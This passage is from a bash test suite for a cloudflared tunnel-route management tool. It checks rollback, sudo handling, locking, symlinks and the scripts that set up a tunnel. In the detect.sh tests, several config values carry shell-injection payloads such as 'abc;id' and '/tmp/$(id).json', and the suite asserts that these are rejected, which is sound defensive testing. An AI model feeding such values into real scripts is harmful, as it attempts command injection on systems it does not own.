out="$(STUB_DNS_CONFLICT=1 run_add app.example.com 8080)" || rc=$?
assert_exit_nonzero "DNS conflict -> non-zero exit" "$rc"
assert_eq "DNS conflict -> config untouched" "same" "$(config_unchanged)"
assert_contains "DNS conflict -> --overwrite-dns hint" "--overwrite-dns" "$out"
assert_not_contains "DNS conflict -> --overwrite-dns never run" "overwrite-dns" "$(cat "$stub_log")"

# Validation failure: no DNS call at all, config untouched
setup; apply_fixture
rc=0
out="$(STUB_VALIDATE_FAIL=1 run_add app.example.com 8080)" || rc=$?
assert_exit_nonzero "validate failure -> non-zero exit" "$rc"
assert_not_contains "validate failure -> no DNS call" "route dns" "$(cat "$stub_log")"
assert_eq "validate failure -> config untouched" "same" "$(config_unchanged)"
assert_eq "validate failure -> no staged temp files" "0" \
    "$(count_files 'config.yml.cftr-tmp.*')"

# Restart failure: config restored, restarted again, non-zero, DNS hint
setup; apply_fixture
rc=0
out="$(STUB_RESTART_FAIL=1 run_add app.example.com 8080)" || rc=$?
assert_exit_nonzero "restart failure -> non-zero exit" "$rc"
assert_eq "restart failure -> config restored" "same" "$(config_unchanged)"
assert_eq "restart failure -> restarted again after restore" "2" \
    "$(grep -c '^systemctl restart ' "$stub_log")"
assert_contains "restart failure -> orphan CNAME dashboard hint" "Cloudflare dashboard" "$out"
assert_not_contains "restart failure -> no unit command line leaked" "argv[]" "$out"

# Owner and mode of the config survive the atomic replace
setup; apply_fixture
chmod 0640 "$work_dir/config.yml"
rc=0
out="$(run_add app.example.com 8080)" || rc=$?
assert_eq "atomic replace keeps mode 0640" "640" \
    "$(stat -c '%a' "$work_dir/config.yml" 2>/dev/null || stat -f '%Lp' "$work_dir/config.yml")"
assert_eq "atomic replace keeps owner" "$(id -u)" \
    "$(stat -c '%u' "$work_dir/config.yml" 2>/dev/null || stat -f '%u' "$work_dir/config.yml")"

# Read-only config -> needs_sudo path (the sudo stub runs as us)
setup; apply_fixture
chmod 0444 "$work_dir/config.yml"
# The stub binary is user-owned: running it as root must be refused...
rc=0
out="$(run_add app.example.com 8080)" || rc=$?
assert_exit_nonzero "sudo + user-owned binary -> refused" "$rc"
assert_contains "sudo + user-owned binary -> clear message" "refusing to run" "$out"
assert_eq "sudo + user-owned binary -> config untouched" "same" "$(config_unchanged)"
assert_not_contains "sudo + user-owned binary -> no DNS call" "route dns" "$(cat "$stub_log")"
# ...unless the suite-only override says the binary is trusted.
rc=0
out="$(CFTR_TRUST_BINARY=1 run_add app.example.com 8080)" || rc=$?
assert_eq "needs_sudo path exits 0" "0" "$rc"
assert_contains "needs_sudo path goes through sudo" "sudo mv -f" "$(cat "$stub_log")"
assert_eq "needs_sudo path keeps mode 0444" "444" \
    "$(stat -c '%a' "$work_dir/config.yml" 2>/dev/null || stat -f '%Lp' "$work_dir/config.yml")"
assert_contains "needs_sudo path writes the new block" "hostname: app.example.com" "$(cat "$work_dir/config.yml")"

# Root-owned-but-readable config (the usual /etc/cloudflared shape) and a
# sudo that needs a password, with no terminal: previews must work with no
# sudo at all; real runs must stop up front with "needs root", unchanged.
setup; apply_fixture
chmod 0444 "$work_dir/config.yml"
rc=0
out="$(STUB_SUDO_NOPASS=1 run_add app.example.com 8080 --diff)" || rc=$?
assert_eq "readable config, no sudo: add --diff exits 0" "0" "$rc"
assert_contains "readable config, no sudo: add --diff shows the block" "+  - hostname: app.example.com" "$out"
rc=0
out="$(STUB_SUDO_NOPASS=1 run_add app.example.com 8080)" || rc=$?
assert_exit_nonzero "no usable sudo: add apply fails" "$rc"
assert_contains "no usable sudo: add says needs root" "needs root" "$out"
assert_eq "no usable sudo: add leaves config unchanged" "same" "$(config_unchanged)"
assert_not_contains "no usable sudo: add makes no DNS call" "route dns" "$(cat "$stub_log")"
rc=0
out="$(STUB_SUDO_NOPASS=1 run_remove keep.example.com --diff)" || rc=$?
assert_eq "readable config, no sudo: remove --diff exits 0" "0" "$rc"
assert_contains "readable config, no sudo: remove --diff shows the removal" "-  - hostname: keep.example.com" "$out"
rc=0
out="$(STUB_SUDO_NOPASS=1 run_remove keep.example.com --keep-dns)" || rc=$?
assert_exit_nonzero "no usable sudo: remove apply fails" "$rc"
assert_contains "no usable sudo: remove says needs root" "needs root" "$out"
assert_eq "no usable sudo: remove leaves config unchanged" "same" "$(config_unchanged)"

# A config path with a space reaches every consumer: apply both ways.
setup
mkdir -p "$work_dir/my conf"
printf 'tunnel: 11111111-2222-3333-4444-555555555555\ncredentials-file: /tmp/x.json\ningress:\n  - service: http_status:404\n' \
    > "$work_dir/my conf/config.yml"
add_unit cloudflared-alpha.service \
    "/usr/bin/cloudflared --config $work_dir/my conf/config.yml tunnel run"
rc=0
out="$(PATH="$stub_dir:$PATH" CFTR_CONFIG="$work_dir/my conf/config.yml" CFTR_BINARY="$fake_bin" \
    bash "$SCRIPTS/add-route.sh" app.example.com 8080 2>&1 </dev/null)" || rc=$?
assert_eq "config path with a space: add applies" "0" "$rc"
assert_contains "config path with a space: block written" "hostname: app.example.com" "$(cat "$work_dir/my conf/config.yml")"
rc=0
out="$(PATH="$stub_dir:$PATH" CFTR_CONFIG="$work_dir/my conf/config.yml" CFTR_BINARY="$fake_bin" \
    bash "$SCRIPTS/remove-route.sh" app.example.com --keep-dns 2>&1 </dev/null)" || rc=$?
assert_eq "config path with a space: remove applies" "0" "$rc"
assert_not_contains "config path with a space: block removed" "app.example.com" "$(cat "$work_dir/my conf/config.yml")"

# Symlinked config: write through to the target, keep the link and the
# target's mode (a mv onto the link would make it a 0777-stat'd file).
setup; apply_fixture
mv "$work_dir/config.yml" "$work_dir/real.yml"
chmod 0640 "$work_dir/real.yml"
ln -s real.yml "$work_dir/config.yml"
rc=0
out="$(run_add app.example.com 8080)" || rc=$?
assert_eq "symlinked config exits 0" "0" "$rc"
assert_eq "symlinked config stays a symlink" "link" \
    "$([ -L "$work_dir/config.yml" ] && echo link || echo file)"
assert_contains "symlink target gets the new block" "hostname: app.example.com" "$(cat "$work_dir/real.yml")"
assert_eq "config behind the symlink keeps mode 0640 (never 0777)" "640" \
    "$(stat -L -c '%a' "$work_dir/config.yml" 2>/dev/null || stat -L -f '%Lp' "$work_dir/config.yml")"

# Existing route, real run: DNS is ensured, but no backup and no restart
setup; apply_fixture
rc=0
out="$(run_add keep.example.com 9000)" || rc=$?
assert_eq "existing route exits 0" "0" "$rc"
assert_eq "existing route -> dns only, no restart" "dns" "$(stub_verbs)"
assert_eq "existing route -> no backup" "0" \
    "$(count_files 'config.yml.bak.*')"

echo
echo "=== backups: no side effects in preview, unique names ==="
setup; apply_fixture
for i in 1 2 3 4 5 6 7; do
    : > "$work_dir/config.yml.bak.2020010${i}-000000"
done
out="$(run_add app.example.com 8080 --diff)"
assert_eq "--diff leaves existing backups alone" "7" \
    "$(count_files 'config.yml.bak.*')"
out="$(run_add app.example.com 8080 --dry-run)"
assert_eq "--dry-run leaves existing backups alone" "7" \
    "$(count_files 'config.yml.bak.*')"
assert_eq "previews never call DNS / validate / restart" "" "$(stub_verbs)"

setup; apply_fixture
run_add one.example.com 8081 >/dev/null 2>&1 || true
run_add two.example.com 8082 >/dev/null 2>&1 || true
assert_eq "two quick applies keep two distinct backups" "2" \
    "$(count_files 'config.yml.bak.*')"

echo
echo "=== catch-all: one anchored regex for count AND insertion ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  #  - service: http_status:404
  - hostname: keep.example.com
    service: http://127.0.0.1:9000
  - service: http_status:404
EOF
out="$(run_add app.example.com 8080 --dry-run)"
assert_eq "commented-out catch-all -> exactly one insert" "1" \
    "$(printf '%s\n' "$out" | grep -c -- '- hostname: app\.example\.com$' || true)"

echo
echo "=== add-route: --path is never shadowed by a host-only rule ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: other.example.com
    service: http://127.0.0.1:7000
  # Added by cloudflare-tunnel-routes on 2026-01-01 | main site
  - hostname: example.com
    service: http://127.0.0.1:8000
  - service: http_status:404
EOF
out="$(run_add example.com 9001 --path '/api/.*' --dry-run)"
preview="$(printf '%s\n' "$out" | sed -n '/^----- 8< -----$/,/^----- >8 -----$/p')"
expected_preview='----- 8< -----
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: other.example.com
    service: http://127.0.0.1:7000
  - hostname: example.com
    path: /api/.*
    service: http://127.0.0.1:9001
  # Added by cloudflare-tunnel-routes on 2026-01-01 | main site
  - hostname: example.com
    service: http://127.0.0.1:8000
  - service: http_status:404
----- >8 -----'
assert_eq "path rule lands above the host-only rule and its comment" "$expected_preview" "$preview"
assert_contains "shadowing is reported" "above the existing host-only rule" "$out"

echo
echo "=== remove-route: indentation-aware blocks ==="
setup
write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: before.example.com
    service: http://127.0.0.1:7000
  - hostname: drop.example.com
    service: https://127.0.0.1:8443
    # self-signed upstream
    originRequest:
      noTLSVerify: true
  - hostname: secure.example.com
    service: http://127.0.0.1:7100
    originRequest:
      access:
        required: true
        teamName: example
        audTag:
          - aaaaaaaaaaaaaaaaaaaa
          - bbbbbbbbbbbbbbbbbbbb
  - hostname: after.example.com
    service: http://127.0.0.1:7200
  - service: http_status:404
EOF
add_unit cloudflared-alpha.service \
    "/usr/bin/cloudflared --no-autoupdate --config $work_dir/config.yml tunnel run"
rc=0
out="$(run_remove drop.example.com --keep-dns)" || rc=$?
assert_eq "remove block with comment + originRequest exits 0" "0" "$rc"
expected="$(cat <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: before.example.com
    service: http://127.0.0.1:7000
  - hostname: secure.example.com
    service: http://127.0.0.1:7100
    originRequest:
      access:
        required: true
        teamName: example
        audTag:
          - aaaaaaaaaaaaaaaaaaaa
          - bbbbbbbbbbbbbbbbbbbb
  - hostname: after.example.com
    service: http://127.0.0.1:7200
  - service: http_status:404
EOF
)"
assert_eq "comment + originRequest removed, neighbours byte-identical" "$expected" "$(cat "$work_dir/config.yml")"
assert_eq "remove-route order: validate, restart" \
    "validate restart:cloudflared-alpha.service" "$(stub_verbs)"

rc=0
out="$(run_remove secure.example.com --keep-dns)" || rc=$?
expected="$(cat <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - hostname: before.example.com
    service: http://127.0.0.1:7000
  - hostname: after.example.com
    service: http://127.0.0.1:7200
  - service: http_status:404
EOF
)"
assert_eq "nested audTag list removed cleanly, neighbours byte-identical" "$expected" "$(cat "$work_dir/config.yml")"

# remove-route: validation failure leaves the config alone
cp "$work_dir/config.yml" "$work_dir/orig.yml"
rc=0
out="$(STUB_VALIDATE_FAIL=1 run_remove after.example.com --keep-dns)" || rc=$?
assert_exit_nonzero "remove validate failure -> non-zero exit" "$rc"
assert_eq "remove validate failure -> config untouched" "same" "$(config_unchanged)"

# remove-route: restart failure restores the config and restarts again
: > "$stub_log"
rc=0
out="$(STUB_RESTART_FAIL=1 run_remove after.example.com --keep-dns)" || rc=$?
assert_exit_nonzero "remove restart failure -> non-zero exit" "$rc"
assert_eq "remove restart failure -> config restored" "same" "$(config_unchanged)"
assert_eq "remove restart failure -> restarted again after restore" "2" \
    "$(grep -c '^systemctl restart ' "$stub_log")"

# remove-route: two units on the config -> nothing restarted, exit 3
add_unit cloudflared-beta.service \
    "/usr/bin/cloudflared --config $work_dir/config.yml tunnel run"
: > "$stub_log"
rc=0
out="$(run_remove after.example.com --keep-dns)" || rc=$?
assert_eq "remove with ambiguous units -> exit 3" "3" "$rc"
assert_not_contains "remove with ambiguous units -> nothing restarted" "systemctl restart" "$(cat "$stub_log")"
assert_not_contains "remove with ambiguous units -> route still removed" \
    "after.example.com" "$(cat "$work_dir/config.yml")"

echo
echo "=== service targeting: the right unit, or none ==="
setup
apply_fixture
: > "$work_dir/units"
printf 'tunnel: 11111111-2222-3333-4444-555555555555\ncredentials-file: /tmp/x.json\ningress:\n  - service: http_status:404\n' > "$work_dir/primary.yml"
add_unit cloudflared.service \
    "/usr/bin/cloudflared --no-autoupdate --config $work_dir/primary.yml tunnel run"
add_unit cloudflared-beta.service \
    "/usr/bin/cloudflared --no-autoupdate --config $work_dir/config.yml tunnel run"
rc=0
out="$(run_add app.example.com 8080)" || rc=$?
assert_eq "secondary config restarts its own unit" \
    "validate dns restart:cloudflared-beta.service" "$(stub_verbs)"
out="$(run_detect)"
assert_contains "detect names the matching unit" "service_unit=cloudflared-beta.service" "$out"

# A unit whose config path merely CONTAINS ours is not a match
setup
apply_fixture
: > "$work_dir/units"
add_unit cloudflared-gamma.service \
    "/usr/bin/cloudflared --config $work_dir/config.yml.old tunnel run"
out="$(run_detect)"
assert_contains "substring config path is not a match" "service_mode=none" "$out"

# Two units on the same config: ambiguous -> restart nothing, exit 3
setup
apply_fixture
add_unit cloudflared-beta.service \
    "/usr/bin/cloudflared --config=$work_dir/config.yml tunnel run"
rc=0
out="$(run_add app.example.com 8080)" || rc=$?
assert_eq "ambiguous units -> exit 3" "3" "$rc"
assert_not_contains "ambiguous units -> nothing restarted" "systemctl restart" "$(cat "$stub_log")"
assert_contains "ambiguous units -> NOT reloaded warning" "NOT reloaded" "$out"
assert_contains "ambiguous units -> config still applied (no rollback)" \
    "hostname: app.example.com" "$(cat "$work_dir/config.yml")"

# CFTR_SERVICE override wins over discovery
rc=0
out="$(CFTR_SERVICE=cloudflared-custom.service run_add two.example.com 8082)" || rc=$?
assert_eq "CFTR_SERVICE honoured" "restart:cloudflared-custom.service" \
    "$(stub_verbs | awk '{ print $NF }')"
rc=0
out="$(CFTR_SERVICE='-x;id' run_detect)" || rc=$?
assert_exit_nonzero "detect rejects a malformed CFTR_SERVICE" "$rc"

# Hand-run cloudflared: never signal it (SIGHUP kills cloudflared)
setup
apply_fixture
: > "$work_dir/units"
rc=0
out="$(STUB_PGREP=1 run_add app.example.com 8080)" || rc=$?
assert_eq "manual mode -> exit 3" "3" "$rc"
assert_contains "manual mode -> restart-manually instructions" "Restart cloudflared manually" "$out"
assert_not_contains "manual mode -> no SIGHUP" "SIGHUP" "$out"

# Remotely-managed (--token) unit: local ingress is ignored - warn
setup
apply_fixture
: > "$work_dir/units"
add_unit cloudflared-delta.service \
    "/usr/bin/cloudflared --config $work_dir/config.yml tunnel run --token eyFAKEFAKEFAKE"
out="$(run_add app.example.com 8080 --dry-run)"
assert_contains "--token unit -> remotely-managed warning" "remotely-managed" "$out"
assert_not_contains "--token value never printed" "eyFAKE" "$out"

echo
echo "=== detect.sh: tunnel names, paths with spaces, strict rejects ==="
setup
write_fixture <<'EOF'
tunnel: my-tunnel.prod_1
credentials-file: "/home/user/my creds/tunnel.json"   # quoted, with a space
ingress:
  - service: http_status:404
EOF
rc=0
out="$(run_detect)" || rc=$?
assert_eq "tunnel NAME accepted (exit 0)" "0" "$rc"
assert_contains "tunnel NAME emitted" "tunnel_id=my-tunnel.prod_1" "$out"
assert_contains "credentials path with a space accepted" \
    "credentials=/home/user/my creds/tunnel.json" "$out"

mkdir -p "$work_dir/conf dir"
cp "$work_dir/config.yml" "$work_dir/conf dir/config.yml"
rc=0
out="$(PATH="$stub_dir:$PATH" CFTR_CONFIG="$work_dir/conf dir/config.yml" CFTR_BINARY="$fake_bin" \
    bash "$SCRIPTS/detect.sh" 2>&1 </dev/null)" || rc=$?
assert_eq "config path with a space accepted" "0" "$rc"

for bad in 'abc;id' 'abc$(id)' '-rf' 'a b'; do
    printf 'tunnel: %s\ncredentials-file: /tmp/x.json\ningress:\n  - service: http_status:404\n' "$bad" \
        > "$work_dir/config.yml"
    rc=0
    out="$(run_detect)" || rc=$?
    assert_eq "tunnel value '$bad' rejected (exit 2)" "2" "$rc"
done
for bad in '/tmp/$(id).json' '/tmp/a"b.json' '/tmp/a;b.json' '/tmp/`id`.json'; do
    printf 'tunnel: 11111111-2222-3333-4444-555555555555\ncredentials-file: %s\ningress:\n  - service: http_status:404\n' "$bad" \
        > "$work_dir/config.yml"
    rc=0
    out="$(run_detect)" || rc=$?
    assert_eq "credentials '$bad' rejected (exit 2)" "2" "$rc"
done
# A newline in the config path: grep-based validation passed it line by line
nl_dir="$work_dir/a
b"
mkdir -p "$nl_dir"
printf 'tunnel: 11111111-2222-3333-4444-555555555555\ncredentials-file: /tmp/x.json\ningress:\n  - service: http_status:404\n' \
    > "$nl_dir/config.yml"
rc=0
out="$(PATH="$stub_dir:$PATH" CFTR_CONFIG="$nl_dir/config.yml" CFTR_BINARY="$fake_bin" \
    bash "$SCRIPTS/detect.sh" 2>&1 </dev/null)" || rc=$?
assert_eq "config path with a newline rejected (exit 2)" "2" "$rc"

echo
echo "=== detect.sh: root-only config, sudo needs a password ==="
if [ "$(id -u)" = "0" ]; then
    echo "  SKIP  running as root - cannot make the config unreadable"
else
    setup
    write_fixture <<'EOF'
tunnel: 11111111-2222-3333-4444-555555555555
credentials-file: /tmp/x.json
ingress:
  - service: http_status:404
EOF
    chmod 000 "$work_dir/config.yml"
    rc=0
    out="$(STUB_SUDO_NOPASS=1 run_detect)" || rc=$?
    assert_eq "unreadable config + sudo needs password -> exit 3" "3" "$rc"
    assert_contains "needs-root message" "needs root" "$out"
    assert_contains "detect tried sudo -n (never a hidden prompt)" "sudo -n cat" "$(cat "$stub_log")"
    rc=0
    out="$(STUB_SUDO_NOPASS=1 run_add app.example.com 8080 --dry-run)" || rc=$?
    assert_exit_nonzero "add-route stops when root is needed" "$rc"
    assert_contains "add-route shows the needs-root error" "needs root" "$out"
    assert_not_contains "add-route does not claim 'no tunnel'" "No cloudflared tunnel detected" "$out"
    chmod 600 "$work_dir/config.yml"
fi

echo
echo "=== locking: one mutating run at a time ==="
if command -v flock >/dev/null 2>&1; then
    setup; apply_fixture
    : > "$work_dir/config.yml.lock"
    exec 8<"$work_dir/config.yml.lock"
    flock -x 8
    rc=0
    out="$(run_add app.example.com 8080)" || rc=$?
    exec 8<&-
    assert_exit_nonzero "flock held -> second run fails" "$rc"
    assert_contains "flock held -> clear message" "another cftr run holds the lock" "$out"
    assert_eq "flock held -> config unchanged" "same" "$(config_unchanged)"
    assert_not_contains "flock held -> no DNS call" "route dns" "$(cat "$stub_log")"
    rc=0
    out="$(run_add app.example.com 8080)" || rc=$?
    assert_eq "flock released -> run succeeds" "0" "$rc"
    out="$(run_add other.example.com 8081 --dry-run)"
    assert_not_contains "previews never wait for the lock" "holds the lock" "$out"
else
    echo "  SKIP  flock not installed - mkdir fallback tested below"
fi

setup; apply_fixture
mkdir "$work_dir/config.yml.lock.d"
rc=0
out="$(CFTR_LOCK_IMPL="mkdir" run_remove keep.example.com --keep-dns)" || rc=$?
assert_exit_nonzero "mkdir lock held -> remove-route fails" "$rc"
assert_contains "mkdir lock held -> clear message" "another cftr run holds the lock" "$out"
assert_eq "mkdir lock held -> config unchanged" "same" "$(config_unchanged)"
rmdir "$work_dir/config.yml.lock.d"
rc=0
out="$(CFTR_LOCK_IMPL="mkdir" run_remove keep.example.com --keep-dns)" || rc=$?
assert_eq "mkdir lock free -> remove-route succeeds" "0" "$rc"
assert_eq "mkdir lock removed on exit" "absent" \
    "$([ -e "$work_dir/config.yml.lock.d" ] && echo present || echo absent)"

# Lock only stops other cftr runs: a hand edit between our first read and
# the swap must not be overwritten (checksum before swap).
setup; apply_fixture
rc=0
out="$(STUB_TOUCH_ON=validate STUB_TOUCH_FILE="$work_dir/config.yml" run_add app.example.com 8080)" || rc=$?
assert_exit_nonzero "edit during validate -> add stops" "$rc"
assert_contains "edit during validate -> clear message" "changed while this run was working on it" "$out"
assert_not_contains "edit during validate -> no DNS call" "route dns" "$(cat "$stub_log")"
assert_contains "edit during validate -> hand edit kept" "edited by hand meanwhile" "$(cat "$work_dir/config.yml")"
assert_not_contains "edit during validate -> our block not written" "app.example.com" "$(cat "$work_dir/config.yml")"

setup; apply_fixture
rc=0
out="$(STUB_TOUCH_ON=dns STUB_TOUCH_FILE="$work_dir/config.yml" run_add app.example.com 8080)" || rc=$?
assert_exit_nonzero "edit during DNS -> add stops before the swap" "$rc"
assert_contains "edit during DNS -> hand edit kept" "edited by hand meanwhile" "$(cat "$work_dir/config.yml")"
assert_not_contains "edit during DNS -> our block not written" "app.example.com" "$(cat "$work_dir/config.yml")"
assert_not_contains "edit during DNS -> nothing restarted" "systemctl restart" "$(cat "$stub_log")"

setup; apply_fixture
rc=0
out="$(STUB_TOUCH_ON=validate STUB_TOUCH_FILE="$work_dir/config.yml" run_remove keep.example.com --keep-dns)" || rc=$?
assert_exit_nonzero "edit during validate -> remove stops" "$rc"
assert_contains "edit during validate -> remove keeps the route" "keep.example.com" "$(cat "$work_dir/config.yml")"
assert_contains "edit during validate -> remove keeps the hand edit" "edited by hand meanwhile" "$(cat "$work_dir/config.yml")"

echo
echo "=== idempotency: same command twice ==="
setup; apply_fixture
run_add app.example.com 8080 >/dev/null 2>&1 || true
: > "$stub_log"
rc=0
out="$(run_add app.example.com 8080)" || rc=$?
assert_eq "repeat add-route exits 0" "0" "$rc"
assert_contains "repeat add-route says so" "already exists" "$out"
assert_contains "repeat add-route: no restart" "no restart needed" "$out"
assert_eq "repeat add-route: only the DNS check runs" "dns" "$(stub_verbs)"
backups_before="$(count_files 'config.yml.bak.*')"
rc=0
out="$(run_remove missing.example.com --keep-dns)" || rc=$?
assert_eq "remove of a missing route exits 0" "0" "$rc"
assert_contains "remove of a missing route says so" "nothing to do" "$out"
assert_eq "remove of a missing route: no new backup" "$backups_before" "$(count_files 'config.yml.bak.*')"

echo
echo "=== setup-new-tunnel.sh (stubbed cloudflared, HOME and sudo) ==="
run_setup() {
    PATH="$stub_dir:$PATH" HOME="$work_dir/home" CFTR_SYSTEM_DIR="$work_dir/etc" \
        bash "$SCRIPTS/setup-new-tunnel.sh" "$@" 2>&1 </dev/null
}
setup_home() {
    mkdir -p "$work_dir/home/.cloudflared" "$work_dir/etc"
    : > "$work_dir/home/.cloudflared/cert.pem"
}

setup; setup_home
rc=0
out="$(run_setup 'bad;name')" || rc=$?
assert_exit_nonzero "setup rejects a bad tunnel name" "$rc"
assert_contains "setup bad-name message" "invalid tunnel name" "$out"
assert_not_contains "setup bad name -> cloudflared never called" "cloudflared" "$(cat "$stub_log")"

setup; setup_home
rc=0
out="$(run_setup demo-tunnel)" || rc=$?
assert_eq "setup happy path exits 0" "0" "$rc"
assert_contains "setup takes the ID from 'Created tunnel ... with id'" \
    "tunnel: aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee" "$(cat "$work_dir/home/.cloudflared/config.yml")"
assert_contains "setup claims completion only after writing" "Setup complete" "$out"
assert_contains "setup on non-TTY skips the service prompt" "Not a terminal" "$out"
assert_not_contains "setup on non-TTY runs no sudo" "sudo " "$(cat "$stub_log")"

setup; setup_home
printf 'tunnel: 99999999-8888-7777-6666-555555555555\n# my routes\n' > "$work_dir/home/.cloudflared/config.yml"
cp "$work_dir/home/.cloudflared/config.yml" "$work_dir/orig-home.yml"
rc=0
out="$(run_setup demo-tunnel)" || rc=$?
assert_eq "setup with an existing config exits 3" "3" "$rc"
assert_eq "setup leaves the existing config untouched" "same" \
    "$(cmp -s "$work_dir/orig-home.yml" "$work_dir/home/.cloudflared/config.yml" && echo same || echo changed)"
assert_not_contains "setup does not claim completion" "Setup complete" "$out"
assert_contains "setup prints what to do" "credentials-file: $work_dir/home/.cloudflared/" "$out"

setup; setup_home
rc=0
out="$(STUB_CREATE_EXISTS=1 run_setup demo-tunnel)" || rc=$?
assert_eq "setup on an existing tunnel exits 0" "0" "$rc"
assert_contains "existing tunnel: ID from 'tunnel info --output json'" \
    "tunnel: 12345678-90ab-4cde-8f01-234567890abc" "$(cat "$work_dir/home/.cloudflared/config.yml")"

setup; setup_home
rc=0
out="$(STUB_CREATE_EXISTS=1 STUB_INFO_NAME=someone-else run_setup demo-tunnel)" || rc=$?
assert_exit_nonzero "tunnel info for another name is not trusted" "$rc"
assert_contains "tunnel info mismatch message" "Could not determine tunnel ID" "$out"

setup; setup_home
printf 'tunnel: old\n' > "$work_dir/etc/config.yml"
rc=0
out="$(STUB_SUDO_LOGONLY=1 run_setup demo-tunnel --yes)" || rc=$?
assert_eq "setup --yes exits 0" "0" "$rc"
sudo_lines="$(grep '^sudo ' "$stub_log" || true)"
assert_contains "--yes installs the service" "sudo cloudflared service install" "$sudo_lines"
backup_at="$(printf '%s\n' "$sudo_lines" | grep -n "^sudo cp -p $work_dir/etc/config.yml $work_dir/etc/config.yml.bak." | cut -d: -f1)"
copy_at="$(printf '%s\n' "$sudo_lines" | grep -n "^sudo cp $work_dir/home/.cloudflared/config.yml $work_dir/etc/config.yml$" | cut -d: -f1)"
assert_eq "--yes backs up the existing service config before overwriting" "yes" \
    "$([ -n "$backup_at" ] && [ -n "$copy_at" ] && [ "$backup_at" -lt "$copy_at" ] && echo yes || echo no)"

setup
mkdir -p "$work_dir/home" "$work_dir/etc"
rc=0
out="$(run_setup demo-tunnel)" || rc=$?
assert_contains "setup without cert.pem logs in first" "cloudflared tunnel login" "$(cat "$stub_log")"

echo
echo "=== install.sh edge cases ==="
# install.sh creates a symlink in $HOME/.claude/skills/. Run it in an isolated
# fake HOME so the real ~/.claude/skills/ directory is untouched.
fake_home="$(mktemp -d)"
out="$(HOME="$fake_home" bash "$REPO_ROOT/install.sh" 2>&1)"
[ -L "$fake_home/.claude/skills/cloudflare-tunnel-routes" ] && {
    printf '  PASS  install.sh creates symlink\n'; PASS=$((PASS+1))
} || {
    printf '  FAIL  install.sh did not create symlink\n' >&2
    FAIL=$((FAIL+1))
}

# Re-running should be idempotent (replaces the symlink)
HOME="$fake_home" bash "$REPO_ROOT/install.sh" >/dev/null 2>&1
[ -L "$fake_home/.claude/skills/cloudflare-tunnel-routes" ] && {
    printf '  PASS  install.sh is idempotent on existing symlink\n'; PASS=$((PASS+1))
} || {
    printf '  FAIL  install.sh broke its own symlink\n' >&2
    FAIL=$((FAIL+1))
}

# If a regular file sits at TARGET_DIR, install.sh must refuse with a clear error
rm -f "$fake_home/.claude/skills/cloudflare-tunnel-routes"
mkdir -p "$fake_home/.claude/skills"
echo "i was here first" > "$fake_home/.claude/skills/cloudflare-tunnel-routes"
rc=0
out="$(HOME="$fake_home" bash "$REPO_ROOT/install.sh" 2>&1)" || rc=$?
assert_exit_nonzero "install.sh refuses to clobber regular file" "$rc"
assert_contains "install.sh names the conflicting file" "regular file" "$out"
rm -rf "$fake_home"

# Clean environment: fresh HOME, no cloudflared anywhere on PATH, no system
# config. The installed skill must resolve, and detection must say "no
# tunnel" (exit 1) - not crash and not claim a tunnel.
setup
fake_home="$work_dir/clean-home"
mkdir -p "$fake_home" "$work_dir/no-etc" "$work_dir/nocf-bin"
for tool in cat dirname id readlink basename mktemp rm date env awk sed grep diff; do
    t="$(command -v "$tool" 2>/dev/null)" && ln -s "$t" "$work_dir/nocf-bin/$tool"
done
for tool in systemctl pgrep sudo ps; do
    ln -s "$stub_dir/$tool" "$work_dir/nocf-bin/$tool"
done
HOME="$fake_home" bash "$REPO_ROOT/install.sh" >/dev/null 2>&1 || true
skill="$fake_home/.claude/skills/cloudflare-tunnel-routes"
assert_eq "clean HOME: installed skill resolves to the repo" "yes" \
    "$([ -f "$skill/scripts/detect.sh" ] && [ -f "$skill/SKILL.md" ] && echo yes || echo no)"
rc=0
out="$(HOME="$fake_home" PATH="$work_dir/nocf-bin" CFTR_SYSTEM_DIR="$work_dir/no-etc" \
    "$BASH" "$skill/scripts/detect.sh" 2>&1 </dev/null)" || rc=$?
assert_eq "clean HOME: detect.sh exits 1 (no tunnel)" "1" "$rc"
assert_contains "clean HOME: detect.sh reports no binary" "binary=" "$out"
rc=0
out="$(HOME="$fake_home" PATH="$work_dir/nocf-bin" CFTR_SYSTEM_DIR="$work_dir/no-etc" \
    "$BASH" "$skill/scripts/add-route.sh" app.example.com 8080 --dry-run 2>&1 </dev/null)" || rc=$?
assert_exit_nonzero "clean HOME: add-route stops" "$rc"
assert_contains "clean HOME: add-route says no tunnel" "No cloudflared tunnel detected" "$out"

# --- summary ---------------------------------------------------------------

echo
echo "=========================="
printf "PASS: %d\nFAIL: %d\n" "$PASS" "$FAIL"
echo "=========================="
[ "$FAIL" -eq 0 ]
